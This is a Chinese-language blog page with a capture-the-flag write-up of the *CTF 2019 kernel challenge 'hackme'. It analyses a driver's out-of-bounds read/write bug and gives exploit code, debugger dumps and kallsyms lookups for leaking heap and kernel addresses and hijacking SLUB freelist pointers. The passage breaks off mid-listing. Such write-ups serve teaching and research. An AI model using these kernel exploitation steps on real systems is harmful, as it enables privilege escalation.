@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="P4nda" />
+
+
+
+<meta name="description" content="*CTF 2019比赛中KERNEL PWN题目hackme的write-up。">
+<meta name="keywords" content="PWN,KERNEL,Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="STARCTF 2019 hackme 解题思路">
+<meta property="og:url" content="http://p4nda.top/2019/05/01/starctf-2019-hackme/index.html">
+<meta property="og:site_name" content="p4nda&#39;s blog">
+<meta property="og:description" content="*CTF 2019比赛中KERNEL PWN题目hackme的write-up。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-05-01T13:43:54.026Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="STARCTF 2019 hackme 解题思路">
+<meta name="twitter:description" content="*CTF 2019比赛中KERNEL PWN题目hackme的write-up。">
+<link rel="stylesheet" href="/live2d/css/live2d.css" />
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="p4nda&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/p4nda.jpeg">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>STARCTF 2019 hackme 解题思路 | p4nda&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?11859a78d84a58f3a5bac3d2ec5ea89e";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/p4nda.jpeg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">P4nda</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:root@p4nda.xyz" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/ret2p4nda" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
+                            
+                                <a class="fa 博客园" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=381124487&Site=junichi&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNABLE-TW/">PWNABLE.TW</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Questions/">Questions</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VULNERABILITY/">VULNERABILITY</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://0gur1.cc">0gur1</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://tacxingxing.com">Tac1t0rnX</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://veritas501.space/">Veritas501</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://p1umer.club/">p1umer</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://blog.aisissel.cn/">Sissel</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="//p4nda.top/WooyunDrops/">Wooyun知识库</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">PWNer of Dubhe | PWN &amp; security | byr</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">P4nda</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/p4nda.jpeg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">P4nda</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:root@p4nda.xyz" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/ret2p4nda" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
+                            
+                                <a class="fa 博客园" target="_blank" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=381124487&Site=junichi&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-starctf-2019-hackme" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/01/starctf-2019-hackme/" class="article-date">
+      <time datetime="2019-05-01T11:10:10.000Z" itemprop="datePublished">2019-05-01</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      STARCTF 2019 hackme 解题思路
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>关于官方的<code>wp</code>还没有来得及看，这种方法利用的是越解读写问题导致的权限提升，但感觉竞争条件应该也是可以使用的。</p>
+<p>相关代码及脚本<a href="https://github.com/ret2p4nda/kernel-pwn/tree/master/hackme" target="_blank" rel="noopener">下载</a></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>题目实现了一个驱动程序，其中交互接口实现了<code>ioctl</code>函数——<code>hackme_ioctl</code>。</p>
+<p>数据交互以<code>0x20</code>大小的结构体作为交互接口，数据结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> arg             struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_3)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: hackme_ioctl/r</span><br><span class="line"><span class="number">00000000</span> idx             dq ?                    ; XREF: hackme_ioctl+<span class="number">46</span>/r</span><br><span class="line"><span class="number">00000000</span>                                         ; hackme_ioctl:loc_8E/r ...</span><br><span class="line"><span class="number">00000008</span> user            dq ?                    ; XREF: hackme_ioctl+<span class="number">51</span>/r</span><br><span class="line"><span class="number">00000008</span>                                         ; hackme_ioctl+<span class="number">99</span>/r ...</span><br><span class="line"><span class="number">00000010</span> len             dq ?                    ; XREF: hackme_ioctl+<span class="number">4</span>D/r</span><br><span class="line"><span class="number">00000010</span>                                         ; hackme_ioctl+<span class="number">95</span>/r ...</span><br><span class="line"><span class="number">00000018</span> offset          dq ?                    ; XREF: hackme_ioctl+<span class="number">49</span>/r</span><br><span class="line"><span class="number">00000018</span>                                         ; hackme_ioctl+<span class="number">91</span>/r</span><br><span class="line"><span class="number">00000020</span> arg             ends</span><br></pre></td></tr></table></figure>
+<p>在<code>ioctl</code>程序中根据操作数的不同实现了四类功能：</p>
+<p><strong>0x30001 free</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">0x30001</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v15 = <span class="number">2L</span>L * LODWORD(v19.idx);</span><br><span class="line">  v16 = pool[v15];</span><br><span class="line">  v17 = &amp;pool[v15];</span><br><span class="line">  <span class="keyword">if</span> ( v16 )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(v16, v4);</span><br><span class="line">    *v17 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>0x30002 write</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">0x30002</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = <span class="number">2L</span>L * LODWORD(v19.idx);</span><br><span class="line">  v10 = pool[v9];</span><br><span class="line">  v11 = &amp;pool[v9];</span><br><span class="line">  <span class="keyword">if</span> ( v10 &amp;&amp; v19.offset + v19.len &lt;= (<span class="keyword">unsigned</span> __int64)v11[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(v19.offset + v10, v19.user, v19.len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>0x30003 read</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">0x30003</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v5 = <span class="number">2L</span>L * LODWORD(v19.idx);</span><br><span class="line">  v6 = pool[v5];</span><br><span class="line">  v7 = &amp;pool[v5];</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v19.offset + v19.len &lt;= (<span class="keyword">unsigned</span> __int64)v7[<span class="number">1</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      copy_to_user(v19.user, v19.offset + v6, v19.len);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>0x30000 alloc</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v12 = v19.len;</span><br><span class="line">v13 = v19.user;</span><br><span class="line">v14 = &amp;pool[<span class="number">2</span> * LODWORD(v19.idx)];</span><br><span class="line"><span class="keyword">if</span> ( *v14 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">v18 = _kmalloc(v19.len, <span class="number">0x6000C0</span>LL);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">*v14 = v18;</span><br><span class="line">copy_from_user(v18, v13, v12);</span><br><span class="line">v14[<span class="number">1</span>] = v12;</span><br></pre></td></tr></table></figure>
+<p>其中，程序维护了一个全局数组<code>pool</code>，其第一个成员记录内核堆地址，第二个成员记录堆的大小，位于驱动的<code>.bss</code>段。不难发现，对于这个数组的存取缺少锁的操作，并且内核以多线程启动，很明显存在竞争类漏洞，如释放内存后立刻竞争读写堆块，造成<code>UAF</code>等。</p>
+<p>此外，在<code>read</code>和<code>write</code>功能中存在明显的越界问题：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v10 &amp;&amp; v19.offset + v19.len &lt;= (<span class="keyword">unsigned</span> __int64)v11[<span class="number">1</span>] )</span><br><span class="line">&#123;</span><br><span class="line">  copy_from_user(v19.offset + v10, v19.user, v19.len);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v19.offset + v19.len &lt;= (<span class="keyword">unsigned</span> __int64)v7[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_to_user(v19.user, v19.offset + v6, v19.len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>可见，<code>v19.offset</code>为负数时，<code>v19.offset + v19.len</code>可以向上越界读写任意长度的内存。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>可见该漏洞的品相是比较好的，因为可以申请任意大小的内存。</p>
+<p>在系统保护层面，开启了<code>kaslr</code>、<code>smep</code>和<code>smap</code>。</p>
+<h2 id="抛砖引玉"><a href="#抛砖引玉" class="headerlink" title="抛砖引玉"></a>抛砖引玉</h2><p>最开始看这题的时候觉得还是比较简单的，如果可以提前喷射大量的<code>cred</code>在申请的内存前的话，通过向前越界读就很容易搜索到<code>cred</code>结构体，然后再通过将<code>cred</code>结构体的<code>uid</code>等值置为<code>0</code>，就可以提权了。但是在实际操作中发现了问题，正如之前<code>WCTF</code>题目中提到的，内核<code>cred</code>分配采用了<code>cred_jar</code>这个新的<code>kmem_cache</code>，与<code>kmalloc</code>使用的<code>kmalloc-xx</code>是隔离的，而且在尝试的过程中发现可以找到分配出来的<code>cred</code>结构体，但是在覆写过程中貌似在内存里存在保护的<code>hole</code>，当调用<code>copy_from_user</code>从<code>cred</code>覆写到我们用<code>kmalloc</code>时，会出现<code>kernel panic</code>，提示在写一块<code>non whitelist</code>的内存，这时我们想到如果可以控制驱动模块<code>bss</code>段上的<code>size</code>成员时，就可以局部写，来直接修改结构体了。</p>
+<p>强行插入了没有做出来的思路先立个<code>flag</code>，这个<code>cred_jar</code>的坑还没有填上，有空的时候再继续翻翻源码。</p>
+<h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>投机取巧的方法用不了了，那就找常规的漏洞利用思路吧，由于开启了<code>kaslr</code>包含，就先从各个模块的地址入手。</p>
+<h3 id="堆地址"><a href="#堆地址" class="headerlink" title="堆地址"></a>堆地址</h3><p>堆地址泄露相对来说容易，因为我们知道一种向上越界读的方法，那么就可在堆上进行构造了。</p>
+<p>基于<code>slub</code>分配器，其释放过的堆块类似于<code>glibc</code>的<code>fastbin</code>，首先是一种后入先出结构，并且其存在<code>FD</code>指针指向下一块空闲的块。</p>
+<p>那么，通过如下的方法可以很快得到堆地址：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">alloc(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span>(fd,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">delete</span>(fd,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">read_from_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">heap_addr = *((<span class="keyword">size_t</span>  *)mem);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] heap addr : %16llx\n"</span>,heap_addr );</span><br></pre></td></tr></table></figure>
+<p>在释放<code>1、3</code>以前，<code>pool</code>中的内容：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">20</span>gx <span class="number">0xffffffffc0002400</span></span><br><span class="line"><span class="number">0xffffffffc0002400</span>:	<span class="number">0xffff88800017a500</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002410</span>:	<span class="number">0xffff88800017a600</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002420</span>:	<span class="number">0xffff88800017a700</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002430</span>:	<span class="number">0xffff88800017a800</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002440</span>:	<span class="number">0xffff88800017a900</span>	<span class="number">0x0000000000000100</span></span><br></pre></td></tr></table></figure>
+<p>释放<code>1、3</code>之后，<code>pool</code>中的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0xffffffffc0002400</span><br><span class="line">0xffffffffc0002400:	0xffff88800017a500	0x0000000000000100</span><br><span class="line">0xffffffffc0002410:	0x0000000000000000	0x0000000000000100</span><br><span class="line">0xffffffffc0002420:	0xffff88800017a700	0x0000000000000100</span><br><span class="line">0xffffffffc0002430:	0x0000000000000000	0x0000000000000100</span><br><span class="line">0xffffffffc0002440:	0xffff88800017a900	0x0000000000000100</span><br></pre></td></tr></table></figure>
+<p>释放的两块堆块中的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /6gx 0xffff88800017a600</span><br><span class="line">0xffff88800017a600:	0xffff88800017aa00	0x4141414141414141</span><br><span class="line">0xffff88800017a610:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffff88800017a620:	0x4141414141414141	0x4141414141414141</span><br><span class="line">pwndbg&gt; x /6gx 0xffff88800017a800</span><br><span class="line">0xffff88800017a800:	0xffff88800017a600	0x4141414141414141</span><br><span class="line">0xffff88800017a810:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffff88800017a820:	0x4141414141414141	0x4141414141414141</span><br></pre></td></tr></table></figure>
+<p>可见，利用<code>4</code>号堆块向前越解读就很容易读出堆地址。</p>
+<h3 id="内核基址"><a href="#内核基址" class="headerlink" title="内核基址"></a>内核基址</h3><p>内核基址的读取需要一点猜测的成分在，可知<code>0</code>号内存<code>0xffff88800017a500</code>之前是已经在用的系统块，那么一定存在一些内核的指针。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">read_from_kernel(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x200</span>);</span><br><span class="line">kernel_addr = *((<span class="keyword">size_t</span>  *)(mem+<span class="number">0x28</span>)) ;</span><br><span class="line"><span class="keyword">if</span> ((kernel_addr &amp; <span class="number">0xfff</span>) != <span class="number">0xae0</span>)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[-] maybe bad kernel leak : %16llx\n"</span>,kernel_addr);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">kernel_addr -= <span class="number">0x849ae0</span>; <span class="comment">//0x849ae0 - sysctl_table_root</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] kernel addr : %16llx\n"</span>,kernel_addr );</span><br></pre></td></tr></table></figure>
+<p>从<code>0</code>号块向前越界搜索，可以发现一个内核地址<code>0xffffffff81849ae0</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">20</span>gx <span class="number">0xffff88800017a500</span><span class="number">-0x200</span></span><br><span class="line"><span class="number">0xffff88800017a300</span>:	<span class="number">0xffff88800017a378</span>	<span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0xffff88800017a310</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffff88800017a320</span>:	<span class="number">0xffff88800017a378</span>	<span class="number">0xffffffff81849ae0</span></span><br><span class="line"><span class="number">0xffff88800017a330</span>:	<span class="number">0xffffffff81849ae0</span>	<span class="number">0xffff888000015100</span></span><br></pre></td></tr></table></figure>
+<p>而这个内核地址利用<code>/proc/kallsyms</code>可以很容易发现属于一个固定函数<code>sysctl_table_root</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="meta"># cat /proc/kallsyms | grep ffffffff81849ae0</span></span><br><span class="line">ffffffff81849ae0 d sysctl_table_root</span><br></pre></td></tr></table></figure>
+<h3 id="模块地址"><a href="#模块地址" class="headerlink" title="模块地址"></a>模块地址</h3><p>在<code>glibc</code>中的<code>fastbin attack</code>常用的方法是劫持<code>fd</code>指针，多次分配后达到任意地址读写的目的。在<code>slub</code>中也可以这样来做。</p>
+<p>想要劫持<code>fd</code>指针，可以通过设置<code>offset</code>为负的方式来修改空闲堆块的指针。</p>
+<p>要修改到哪里是一个问题，利用已有的内核地址，可以找到一个包含模块指针的内存位置——<code>mod_tree</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="meta"># cat /proc/kallsyms | grep mod_tree</span></span><br><span class="line">ffffffff8106df00 t __mod_tree_remove</span><br><span class="line">ffffffff8106e720 t __mod_tree_insert</span><br><span class="line">ffffffff81811000 d mod_tree</span><br><span class="line">/home/pwn <span class="meta"># cat /proc/kallsyms | grep hackme</span></span><br><span class="line">ffffffffc0000000 t hackme_ioctl	[hackme]</span><br><span class="line">ffffffffc0002000 d misc	[hackme]</span><br><span class="line">ffffffffc0002060 d fops	[hackme]</span><br><span class="line">ffffffffc0001068 r _note_6	[hackme]</span><br><span class="line">ffffffffc0002400 b pool	[hackme]</span><br><span class="line">ffffffffc0002180 d __this_module	[hackme]</span><br><span class="line">ffffffffc0000190 t cleanup_module	[hackme]</span><br><span class="line">ffffffffc0000170 t init_module	[hackme]</span><br><span class="line">ffffffffc0000190 t 